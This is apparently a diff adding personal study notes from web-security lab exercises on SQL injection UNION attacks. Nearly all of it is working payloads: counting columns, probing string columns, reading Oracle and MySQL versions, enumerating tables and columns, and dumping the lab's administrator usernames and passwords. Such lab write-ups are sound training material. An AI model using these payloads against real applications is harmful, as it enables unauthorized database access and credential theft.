@@ -1,0 +1,59 @@
+
+2. Union Attacks - the results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+2.1 - using the injection: ' ORDER By 1,2,3,4,... until we get an error to know how many columnks are on the original query 
+
+    a) /filter?category=Gifts'+ORDER+by+4+-- -> gives an error, so there are 3 columns on the original query
+
+    b) /filter?category=Gifts'+Union+Select+NULL,+Null,+NUll-- -> we got 200 (OK) response. this confirms the numbers of columns
+
+2.2 - Probing each column to test if can have string data using UNION SELECT injection
+example:
+
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'-- 
+
+    a) /filter?category=Gifts'+Union+Select+NULL,+'a',+NUll-- -> good response so, the third (or second?) column on the original query is String type.
+    b) '+Union+Select+NULL,+'v4Lpxg',+NUll--  --> we retrieve the string 'v4Lpxg' as request in the challenge
+
+
+2.3
+
+    a) '+Union+Select+username,+password+from+users+-- -> we got the creds
+            username:    administrator
+            password:    39i979
+
+Examining the database
+
+2.4 Examining the database in SQL injection attacks
+
+2.4.1 - retrieving oracle version info
+    a)  /filter?category=Accessories'+order+by+3+-- -> gives error. Now there are 2 columns.
+    b)  /filter?category=Accessories'+UNION+SELECT+null,+banner+from+v$version+-- --> gives the info requested
+
+2.4.2 - retrieving mysql version info
+    a) /filter?category=Pets'+order+by+2+# --> to succeed is necessary to use '#' to comment
+    b) '+union+select+null,+@@version+# --> the response add a row with the mysql version
+
+2.5 - Listing the contents of the database
+
+2.5.1 /filter?category=Gifts'+order+by+2+--  --> with 3 we have an error, determined number of columns
+2.5.2 '+union+select+'a',+null+from+information_schema.tables+-- --> know which columns are string type. The two columns are string type.
+2.5.3 '+union+select+null,+table_name+from+information_schema.tables+-- --> put in one of the columns "table_name" to dump the tables from the DB
+2.5.4 '+union+select+null,+column_name+from+information_schema.columns+where+table_name+=+'TABLE-NAME'+-- --> know table columns. Attention TAble-Name between ''
+2.5.6 '+union+select+username_rwzuhe,+password_thveia+from+users_vuxjjm+-- --> the table users_vuxjjm  has admin creds
+
+        administrator
+        6nr1bi37y7okcxltd9pn
+
+2.6 - Equivalent to information schema on Oracle
+
+2.6.1  /filter?category=Food+%26+Drink'+order+by+2+-- --> if 3 we have an error, determine number of columns
+2.6.2  '+union+select+'a',+null+from+all_tables+-- --> iterating columns to know which are string type (the two columns are string type)
+2.6.3  '+union+select+null,+table_name+from+all_tables+-- --> put in one of the columns "table_name" to dump the tables from the DB
+2.6.4  '+union+select+column_name,+null+from+all_tab_columns+where+table_name+=+'USERS_VMTZRT'+-- --> know table columns. Attention TAble-Name between ''('USER$')
+2.6.5  '+union+select+USERNAME_GGOPNU,+PASSWORD_QTMWWN+from+USERS_VMTZRT+-- --> the table USERS_VMTZRT has admin creds
+
+
